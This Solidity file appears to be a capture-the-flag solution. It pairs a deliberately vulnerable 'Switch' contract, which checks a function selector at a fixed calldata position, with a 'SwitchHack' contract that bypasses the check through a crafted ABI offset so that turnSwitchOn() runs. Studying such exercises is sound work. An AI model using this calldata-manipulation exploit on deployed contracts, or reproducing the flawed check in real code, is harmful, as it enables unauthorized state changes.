// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract SwitchHack {
     // calldata layout
        // 0xflipSwitch(bytes memory data)0 0x00-0x04
        // 00000000000000000000000000000060 0x04-0x24
        // 00000000000000000000000000000000 0x24-0x44
        // turnSwitchOff()00000000000000000 0x44-0x64
        // 00000000000000000000000000000004 0x64-0x84
        // turnSwitchOn()000000000000000000 0x84-0xa4
        
    constructor(address _levelAddress) {
        Switch level = Switch(_levelAddress);
        bytes memory callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(level).call(callData);
    }
}